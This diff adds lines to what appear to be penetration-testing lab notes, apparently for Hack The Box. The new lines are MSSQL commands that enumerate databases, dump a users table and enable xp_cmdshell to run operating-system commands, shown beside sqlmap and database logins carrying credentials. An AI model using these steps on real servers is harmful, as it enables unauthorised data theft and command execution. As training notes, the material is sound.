@@ -31,7 +31,27 @@ sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-age
 # MYSQL server
 
 sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+SELECT name FROM master.dbo.sysdatabases
+GO
+USE htbusers;
+GO
+SHOW TABLES;
+SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+GO
+SELECT * FROM users
+go
+xp_cmdshell 'whoami'
+GO
+EXECUTE sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
 
+********************************************************************************
 mysql -h 123.123.131.131 -u root -p
 
 mysql -u bolt_dba -p
